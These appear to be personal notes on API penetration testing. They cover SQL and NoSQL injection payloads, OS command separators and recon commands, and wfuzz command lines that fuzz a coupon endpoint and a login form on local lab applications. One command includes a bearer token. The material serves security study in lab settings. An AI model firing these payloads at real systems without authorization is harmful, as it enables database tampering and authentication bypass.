When reviewing an API documentation, if it is expecting a certain type of input (number, string, boolean) send - 
1. a very large number
2. a very large string
3. negative number
4. string instead of number or boolean
5. random charachters
6. boolean values
7. meta characters

## Metacharacters 
    '

    ''

    ;%00

    --

    -- -

    ""

    ;

    ' OR '1

    ' OR 1 -- -

    " OR "" = "

    " OR 1 = 1 -- -

    ' OR '' = '

    OR 1=1

>SELECT * FROM userdb WHERE username = 'hAPI_hacker' AND password = 'Password1!'

>SELECT * FROM userdb WHERE username = 'hAPI_hacker' OR 1=1-- -

## NoSQL Injection

APIs commonly use NoSQL databases due to how well they scale with the architecture designs common among APIs. Also, NoSQL injection techniques aren’t as well-known as their structured counterparts. Due to this one small fact, you might be more likely to find NoSQL injections.

As you hunt, remember that NoSQL databases do not share as many commonalities as the different SQL databases do. NoSQL is an umbrella term that means the database does not use SQL. Therefore, these databases have unique structures, modes of querying, vulnerabilities, and exploits. Practically speaking, you’ll conduct many similar attacks and target similar requests, but your actual payloads will vary. The following are common NoSQL metacharacters you could send in an API request to manipulate the database:

    $gt 

    {"$gt":""}

    {"$gt":-1}

    $ne

    {"$ne":""}

    {"$ne":-1}

    $nin

    {"$nin":1}

    {"$nin":[1]}

    {"$where":  "sleep(1000)"}

## OS Injection
Operating system command injection is similar to the other injection attacks we’ve covered in this chapter, but instead of, say, database queries, you’ll inject a command separator and operating system commands. When you’re performing operating system injection, it helps a great deal to know which operating system is running on the target server. Make sure you get the most out of your Nmap scans during reconnaissance in an attempt to glean this information.

As with all other injection attacks, you’ll begin by finding a potential injection point. Operating system command injection typically requires being able to leverage system commands that the application has access to or escaping the application altogether. Some key places to target include URL query strings, request parameters, and headers, as well as any request that has thrown unique or verbose errors (especially those containing any operating system information) during fuzzing attempts.

Characters such as the following all act as command separators, which enable a program to pair multiple commands together on a single line. If a web application is vulnerable, it would allow an attacker to add command separators to existing command and then follow it with additional operating system commands:

|

||

&

&&

'

"

;

'"

If you don’t know a target’s underlying operating system, put your API fuzzing skills to work by using two payload positions: one for the command separator followed by a second for the operating system command. The table below is a small list of potential operating system commands to use.

Common Operating System Commands to Use in Injection Attacks

Operating system

Command

Windows

    ipconfig shows the network configuration.

    dir prints the contents of a directory.

    ver prints the operating system and version.

    whoami prints the current user.

    *nix (Linux and Unix)

    ifconfig shows the network configuration.

    ls prints the contents of a directory.

    pwd prints the current working directory.

    whoami prints the current user.

 
 ## Steps
 1. Find potential endpoints and parameters.
 2. Try fuzzing and finding anomalities in postman by variables.
 3. Try sending the request to burp and send it to intruder to automate payloads on target parameter.
4. save request to a file from burp suite and replace the fuzzing parameter value with FUZZ - {"coupon_code":FUZZ}
5. using wfuzz to automate the testing -
   
        wfuzz -z file,/usr/share/wordlists/PayloadsAllTheThings/NoSQL\ Injection/Intruder/NoSQL.txt -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ0ZXN0ZXJAdGVzdC5jb20iLCJyb2xlIjoidXNlciIsImlhdCI6MTcxMjQ3NDYzMCwiZXhwIjoxNzEzMDc5NDMwfQ.pY1PF5wW0wXFYde1kJIGLlrzjTGD_IMmrj2CTr3S_XDEp0myEiPrZNAZbD62RP21iw00ZofwkhauW7I6fm54pbnXKvhG7sOBCFIigsx6virBSiMpNBz8rnWCciWZCyEUL6Gh2qXZZkitLue62m4lBipyrsuqHCFMJjglgg2kDWcae4gC_9pLxcG6gmpmzJwD6qPTUMD7aOdQqJEFfqaSj-nMxL_0WeIXjY_CgJ5loJHIiDAzZC4YsHpQhXf5zQUIM6q0g8Xee3KfhWppboqKVkc0wY_FJgxxD_GthHG3ix5l1ekJSF99mDDz7Iy8Hs4CnS2rlx4_HgZ8yrNvndmo8g" -d "{\"coupon_code\":FUZZ}" --sc 200 -p localhost:8080 http://localhost:8888/community/api/v2/coupon/validate-coupon


## Note
**Remember to not put space before payload list directory**
1. Look at how the payload is getting succeeded in execution. 
     
        wfuzz -z file,test -H "Content-Type: application/json" -d "{\"username\":\"FUZZ\",\"password\":\"password\"}" -p localhost:8080 http://localhost/vapi/api8/user/login

2. Check for " marks and escape them accordingly to get right results

        wfuzz -z file,/usr/share/wordlists/PayloadsAllTheThings/SQL\ Injection/Intruder/Auth_Bypass.txt -H "Content-Type: application/json" -d "{\"username\":\"FUZZ\",\"password\":\"password\"}" --sc 200  http://localhost/vapi/api8/user/login
